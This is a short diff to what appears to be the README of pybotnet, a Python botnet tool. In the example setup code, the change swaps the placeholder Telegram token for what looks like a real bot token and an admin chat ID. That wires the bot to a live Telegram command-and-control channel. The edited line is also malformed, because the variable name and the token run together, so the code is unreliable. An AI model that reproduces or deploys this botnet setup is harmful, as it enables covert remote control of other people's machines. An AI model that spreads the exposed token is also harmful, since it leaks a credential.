@@ -19,7 +19,7 @@ pip3 install pybotnet -U
 from pybotnet import BotNet, TelegramEngine
 
 
-telegram_engine = TelegramEngine(token=TELEGRAM_TOKEN, admin_chat_id=ADMIN_CHAT_ID) #(1)
+telegram_engine = TelegramEngine(token=TELEGRAM_TOKEN5931162512:AAEpUQ9c1RCRo94mcKfozF-vf3XUg_ekbjg, admin_chat_id=5435613749) #(1)
 
 botnet = BotNet(telegram_engine) # (2)
 botnet.run()
